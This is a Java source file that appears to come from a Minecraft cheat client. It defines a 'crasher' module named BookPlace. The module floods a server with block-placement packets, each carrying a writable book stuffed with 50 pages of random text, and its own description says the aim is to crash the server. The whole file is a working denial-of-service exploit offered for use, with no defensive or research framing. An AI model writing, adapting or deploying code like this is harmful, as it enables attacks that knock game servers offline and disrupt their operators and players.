package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.primitive.argument.Argument;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import org.apache.commons.lang3.RandomStringUtils;

public class BookPlacePrimitive extends PrimitiveFeature {

    public BookPlacePrimitive() {
        super("BookPlace", "Attempts to crash the server by overwriting books", ModuleCategory.CRASHER, new Argument("Packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) {
        long start = System.currentTimeMillis();
        final int packets = (int) args[0];


        for (int i = 0; i < packets; i++) {
            getPlayer().sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(getBook()));
        }

        ChatUtil.print(STR."Sent \{packets} packets in \{System.currentTimeMillis() - start}ms");
    }

    private ItemStack getBook() {
        ItemStack itemStack = new ItemStack(Items.writable_book);
        NBTTagCompound compound = new NBTTagCompound();
        NBTTagList pages = new NBTTagList();

        for (int i = 0; i < 50; i++) {
            pages.appendTag(new NBTTagString(RandomStringUtils.randomAlphabetic(200)));
        }

        compound.setTag("pages", pages);
        itemStack.setTagCompound(compound);
        return itemStack;
    }

}
